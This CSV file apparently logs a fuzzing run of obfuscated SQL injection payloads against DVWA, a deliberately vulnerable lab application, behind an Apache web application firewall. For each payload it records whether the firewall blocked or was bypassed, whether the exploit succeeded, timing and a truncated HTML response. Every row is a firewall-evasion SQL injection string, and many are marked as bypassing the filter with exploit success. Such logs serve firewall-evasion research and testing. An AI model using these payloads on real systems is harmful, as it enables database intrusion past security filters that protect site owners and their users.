Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27<@!=1+or+!%0b{`if`%0b1}=1=%0b(not+{x%0b(select+1)}=1)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.025,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0b||+!+{`if`+1}=1=+(false)+or',Bypassed,No,None,Invalid,0.0173,73.78,No,500,
0%27<@!=.1%0b||%0b0=+(not+{x%0b(select+1)}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0149,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+or%0b!%0btrue=%0b(!~false)+||',Bypassed,No,None,Invalid,0.0222,73.78,No,500,
0'<@!=1.%0bor+!%0b{`if`+1}=1=%0b(not+{`if`%0b1}=1)+or%27,Bypassed,No,None,Invalid,0.021,73.78,No,500,
0%27<@!=1+or+{x+(select+1)}=1%0blike+{`if`+1}=1%0bor%27,Blocked,No,None,Invalid,0.0186,73.78,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=.1%0b||%0b!+{x%0b(select%0b1)}=1=+(!%0b1)%0bor%27,Bypassed,No,None,Invalid,0.0197,73.78,No,500,
0'<@=.1+||%0bnot+true=%0b(false)+or',Bypassed,No,None,Invalid,0.0546,73.78,No,500,
0%27<@!=.1+or+not%0b{a%0b1}=1=%0b(not%0b{a+1}=1)+||',Bypassed,No,None,Invalid,0.0213,73.78,No,500,
0'<@=1+or%0bnot%0b{a+1}=1=+(not%0b{x+(select+1)}=1)+,Bypassed,No,None,Invalid,0.0302,73.78,No,500,
0%27<@=.1%0bor%0b!%0b{x+(select%0b1)}=1=+(not~false)+or',Bypassed,No,None,Invalid,0.0418,73.78,No,500,
0'<@!=1+||+not+{x+(select+1)}=1=+(!+{x%0b(select+1)}=1),Blocked,No,None,Invalid,0.0056,73.78,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1%0bor%0b!+{`if`+1}=1=%0b(not+{a%0b1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0235,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1+||%0bnot+1=+(!+{x+(select+1)}=1)+or',Blocked,No,None,Invalid,0.0444,73.78,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1+or+not+{a+1}=1=%0b(not%7e0)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0186,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1%0b||+not+{x+(select+1)}=1=+(not%0b{x%0b(select%0b1)}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0409,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0bor%0bnot%7efalse=+(not%0b{`if`+1}=1)+||',Bypassed,No,None,Invalid,0.0272,73.78,No,500,
0'<@!=1+||+not%0b1=+(!+{a+1}=1)+||',Blocked,No,None,Invalid,0.0397,73.78,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=.1+or%0b!+true=+(!~false)%0b||%27,Blocked,No,None,Invalid,0.019,73.78,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27or+!@<@.%0bor+!+{`if`%0b1}=1=%0b(not+{a+1}=1)%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0185,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0b||+true%0blike%0b{`if`%0b1}=1%0bor%27,Bypassed,No,None,Invalid,0.0412,73.78,No,500,
0'<@!=1.+||+!+true=+(not+{x%0b(select+1)}=1)+or%27,Bypassed,No,None,Invalid,0.0249,73.78,No,500,
0'<@=1+||%0b!+{x%0b(select+1)}=1=+(not+{`if`%0b1}=1)+,Bypassed,No,None,Invalid,0.022,73.78,No,500,
0'<@=1%0bor%0btrue%0blike+{x%0b(select+1)}=1--%0b,Bypassed,No,None,Invalid,0.0357,73.78,No,500,
0%27<@=1.+or%0bnot%0b{`if`+1}=1=+(!+{`if`%0b1}=1)--%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0186,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+or+not+{a%0b1}=1=+(!%0b{`if`%0b1}=1)+||',Bypassed,No,None,Invalid,0.0252,73.78,No,500,
0'<@=.1+||%0b{a+1}=1%0blike+{x+(select+1)}=1+or',Blocked,No,None,Invalid,0.0354,73.78,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1+or%0bnot+{x%0b(select%0b1)}=1=%0b(not+{x+(select%0b1)}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0391,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0b||%0bfalse=%0b(not+{x+(select+1)}=1)%23,Bypassed,No,None,Invalid,0.0328,73.78,No,500,
0'<@=1+or%0b!%0b{x%0b(select%0b1)}=1=%0b(not+{a%0b1}=1)--,Blocked,No,None,Invalid,0.028,73.78,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=.1+||%0bnot+{x%0b(select+1)}=1=%0b(false)--+,Bypassed,No,None,Invalid,0.0448,73.78,No,500,
0'<@!=1+||%0bnot+{a%0b1}=1=%0b(!%0b{x+(select+1)}=1)%0b,Bypassed,No,None,Invalid,0.036,73.78,No,500,
0+or%0bnot%0b{`if`%0b1}=1=%0b(not%0b{x%0b(select+1)}=1)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0468,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+||+!+{x%0b(select%0b1)}=1=+(!%0b{x+(select%0b1)}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0276,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+or+not%0b{`if`+1}=1=+(not+{a+1}=1)+or',Bypassed,No,None,Invalid,0.0548,73.78,No,500,
0'<@=1+or+not%0b{x+(select%0b1)}=1=%0b(not%0b{x+(select+1)}=1),Bypassed,No,None,Invalid,0.0368,73.78,No,500,
0'<@=1%0b||+not+{`if`+1}=1=+(not+{`if`%0b1}=1)+or%27,Bypassed,No,None,Invalid,0.0278,73.78,No,500,
0%27<@!=1%0bor%0bnot+{x+(select%0b1)}=1=+(!%0b{`if`%0b1}=1)%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0778,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0bor+not%7e0=+(not%0b{x%0b(select+1)}=1)--+,Bypassed,No,None,Invalid,0.0237,73.78,No,500,
0%27<@!=1+||+not+{x+(select+1)}=1=%0b(not+{x+(select+1)}=1,Blocked,No,None,Invalid,0.0198,73.78,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.+||+!%0b{x+(select+1)}=1=+(not~false)--%0b,Bypassed,No,None,Invalid,0.0275,73.78,No,500,
0'<@=.1%0bor+!+{x+(select%0b1)}=1=%0b(!+{x+(select+1)}=1),Bypassed,No,None,Invalid,0.0286,73.78,No,500,
0%27||%0b!@<@%0b||+{x%0b(select%0b1)}=1%0blike+{a%0b1}=1%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0107,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||+{x+(select%0b1)}=1+like+{`if`+1}=1%0b||%27,Blocked,No,None,Invalid,0.0219,73.78,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1+||+!%0b{x%0b(select%0b1)}=1=%0b(!%0b{x+(select%0b1)}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0402,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or%0bnot%7efalse=%0b(!%0b{x%0b(select+1)}=1)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0346,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+or+{x%0b(select+1)}=1+like%0b{a+1}=1+or',Blocked,No,None,Invalid,0.0182,73.78,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.%0bor%0bnot%0b{`if`+1}=1=+(!%0b{`if`%0b1}=1)%0b||',Bypassed,No,None,Invalid,0.0284,73.78,No,500,
0'<@!=1.+or+0=%0b(not+{x+(select+1)}=1)+or',Blocked,No,None,Invalid,0.0251,73.78,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1%0bor%0bnot+{x+(select+1)}=1=%0b(0)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0266,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+||+not%0b{x+(select%0b1)}=1=%0b(not%0b{`if`%0b1}=1)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0224,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0bor%0bnot+{x%0b(select+1)}=1=+(not+1)--%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0231,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+or%0bnot+{a+1}=1=%0b(!+{x+(select+1)}=1)%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0471,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0bor%0b!%0b{x+(select%0b1)}=1=%0b(!+{x%0b(select+1)}=1,Bypassed,No,None,Invalid,0.0323,73.78,No,500,
0'<@!=.1%0b||+!+{x+(select%0b1)}=1=+(not+{x+(select%0b1)}=1),Bypassed,No,None,Invalid,0.0214,73.78,No,500,
0%27<@=1.+or+not%0b{x%0b(select+1)}=1=%0b(!%0b{a+1}=1)+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0293,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0bor+not+{a+1}=1=+(false)+or',Bypassed,No,None,Invalid,0.0367,73.78,No,500,
0'<@!=1%0b||%0b!+{x%0b(select%0b1)}=1=%0b(!%0btrue)+||%27,Bypassed,No,None,Invalid,0.0352,73.78,No,500,
0%27<@!=.1%0bor+not+{`if`+1}=1=+(!+{a%0b1}=1)+or',Bypassed,No,None,Invalid,0.0334,73.78,No,500,
0'<@!=1%0b||%0bnot+1=%0b(!+{x%0b(select%0b1)}=1)%0b||%27,Bypassed,No,None,Invalid,0.0322,73.78,No,500,
0%27<@!=1%0bor+{x+(select+1)}=1+like+{x+(select%0b1)}=1+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0358,73.78,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
